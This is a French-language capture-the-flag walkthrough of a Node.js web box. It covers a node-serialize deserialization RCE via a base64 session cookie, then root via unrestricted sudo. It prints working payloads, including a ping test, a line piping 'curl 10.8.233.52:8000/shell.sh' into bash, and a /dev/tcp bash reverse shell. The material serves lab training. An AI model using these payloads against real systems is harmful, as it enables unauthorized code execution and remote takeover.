![image.png](attachment:e39efc95-1fee-4f41-b4bd-1d6d768b47b4:image.png)

> On trouve un port 80 ouvert et on check le site
> 

![image.png](attachment:86e8ad64-c2d0-46a5-ab14-c531776b137b:image.png)

<aside>
⛔

Le gobuster ne fonctionne pas, renvoie des 200 pour toutes les requetes, potentiels waf, reverse proxy ou un backend avec fallback (ex: `/anything` → page par défaut)

</aside>

> On décide donc de regarder la page source du site
> 

```jsx
<script>
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
    </script>

```

<aside>
💡

Il faut noter qu’ici il y a un souci de sérialisation: 

en gros :

👉 **Sérialiser = transformer un objet en texte**

👉 **Désérialiser = transformer le texte en objet**

</aside>

En gros dans ce site il y a uniquement un mail d’envoyer, donc pas besoin de sérialiser (on sérialise quand c un objet complexe et qu’on ne peut pas lenvoyer au serveur comme ça il faut donc le tranformer en texte)

Mais lors de la création d’un cookie on voit bien qu’il y a de la sérialisation car ça devient un objet complexe, et c’est ça qu’on va tenter de corrompre, 

On remarque que c’est ce qu’on tape sur le site qui est sérialiser, donc on va voir s’il y a une rce  

![image.png](attachment:ae632c74-f6b2-4af1-89ef-9b29d78198a8:image.png)

![image.png](attachment:002dd9ee-f85e-42c9-a489-976b7be9a803:image.png)

On utilise alors un payload qui justement utilise des commandes system pour voir si le code est vulnérable :

```jsx
{“email”:”_$$ND_FUNC$$_function (){\n \t require(‘child_process’).exec(‘ping -c 1 Yourip’,function(error, stdout, stderr) { console.log(stdout) });\n }()”}
```

on se met en écoute 

![image.png](attachment:5899a6e7-7bd6-4fec-8e64-7f9b58b95ed8:image.png)

et on met le payload en base 64 dans les cookies

![image.png](attachment:e6d2e3a4-261b-4f2d-b6d4-3dfa4a0332b3:image.png)

```jsx
Donc la logique réelle est :
Je vois un cookie encodé → je le décode
Je vois du JSON → suspicion de désérialisation
C’est du NodeJS → je pense aux libs vulnérables
Je teste un payload connu (_$$ND_FUNC$$_)
```

et ça fonctionne 

![image.png](attachment:2586c279-01d9-400f-a0ad-96aa5231d020:image.png)

Donc on crée un revshell

```jsx
{“email”:”_$$ND_FUNC$$_function (){\n \t require(‘child_process’).exec(‘curl 10.8.233.52:8000/shell.sh | bash’,function(error, stdout, stderr) { console.log(stdout) });\n }()”}
```

et donc avant de le mettre dans les cookies, on ouvre un serveur web dans notre machine d’attaque et on met un revshell 

![image.png](attachment:513a184c-aafc-4440-a964-5dd2383ddb99:image.png)

<aside>
💡

La raison de pourquoi on ne met pas directement le revshell dans le payload comme ceci :

_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/10.8.233.52/8585 0>&1')}()

on doit gérer :

guillemets `' " -`sauts de ligne `\n-` aractères spéciaux

</aside>

Et donc la on a un revshell qui marche 

---

pour le root on tape :

```jsx
sudo -l
```

on tombe sur (ALL:ALL)

une connerie comme ça 

ce qui veut dire qu’on peut appliquer sudo sur tous les fichiers 

donc :

```jsx
sudo su
```

félicitations on est root
